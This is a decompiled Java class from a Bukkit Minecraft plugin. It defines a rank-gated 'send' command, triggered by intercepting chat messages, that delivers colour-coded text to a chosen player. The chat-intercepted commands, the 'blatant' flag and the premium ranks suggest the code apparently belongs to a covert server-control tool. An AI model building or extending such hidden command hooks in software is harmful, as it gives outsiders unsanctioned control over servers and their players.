package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "send",
   description = "Broadcasts a message to the specified player",
   blatant = true,
   rank = Rank.PREMIUM
)
public class SendCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length < 2) {
         ChatUtil.sendChat(var1.getPlayer(), "Please, use send <player> <msg>");
      } else {
         Player var4 = Bukkit.getPlayerExact(var3[0]);
         if (var4 == null) {
            ChatUtil.sendChat(var1.getPlayer(), "The player " + var3[0] + " is not online!");
         } else {
            var4.sendMessage(ChatColor.translateAlternateColorCodes('&', String.join(" ", var3).substring(var3[0].length() + 36)));
            ChatUtil.sendChat(var1.getPlayer(), "Successfully broadcast your message to the player.");
         }
      }
   }
}
